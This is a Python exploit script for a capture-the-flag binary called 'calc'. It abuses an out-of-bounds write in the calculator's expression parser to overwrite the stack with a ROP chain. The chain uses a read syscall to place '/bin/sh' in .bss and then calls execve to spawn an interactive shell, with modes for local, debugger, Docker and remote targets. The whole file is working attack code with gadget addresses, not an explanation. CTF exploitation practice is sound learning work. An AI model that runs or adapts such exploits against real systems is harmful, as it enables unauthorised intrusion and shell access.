#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwnie import *
from time import sleep

# context.log_level = 'debug'
exe = context.binary = ELF('./calc', checksec=False)
libc = exe.libc

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw, aslr=False)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    elif args.DOCKER:
        p = remote("localhost", 1337)
        time.sleep(1)
        pid = process(["pgrep", "-fx", "/home/app/chall"]).recvall().strip().decode()
        gdb.attach(int(pid), gdbscript=gdbscript, exe=exe.path)
        pause()
        return p
    else:
        return process([exe.path] + argv, *a, **kw, aslr=False)

gdbscript = '''

# b *0x80493ED
# b *0x8049144
# b *eval
b *0x8049433
c
'''.format(**locals())

p = start()

# ==================== EXPLOIT ====================

offset = [0]
def parse(value) -> bytes:

    curr_offset = offset[0] + 360 # offset to reach return address
    offset[0] += 1 
    return bytes(f'+{curr_offset}+{value}'.encode('utf-8'))

def exploit():

    pop_ecx_ebx = 0x080701d1  # pop ecx; pop ebx; ret;
    pop_eax = 0x080bc545      # pop eax; ret;
    bss = 0x80ecf80
    pop_esi = 0x0804a095      # pop esi; ret;
    xchg_ecx = 0x080e2141     # xchg ecx, eax; or cl, byte ptr [esi]; adc al, 0x41; ret;


    read = [
        parse(pop_ecx_ebx),
        parse(bss),
        parse(0),
        parse(pop_esi),
        parse(bss),
        parse(0x080e4a79), # xchg ebx, eax
        parse(0x080701aa), # pop edx
        parse(0x100),
        parse(pop_eax),
        parse(0x03),
        parse(0x08070880), # int 0x80; ret
    ]


    execve = [
        parse(pop_esi),
        parse(bss + 100),

        parse(0x080550d0), # xor eax, eax
        parse(xchg_ecx),

        parse(0x080481d1), # pop ebx
        parse(bss),

        parse(0x080550d0), # xor eax, eax
        parse(0x080ae7cc), # xchg edx, eax

        parse(pop_eax),
        parse(0x0b),

        parse(0x08070880), # int 0x80; ret
    ]


    # print(read)
    # print(execve)
    pl = read + execve

    for p in pl[::-1]:
        print(f'Write {p}')
        sl(p)
        print(rl())

    sl(b'')
    sl(b'/bin/sh\x00')

    interactive()

if __name__ == '__main__':
    exploit()
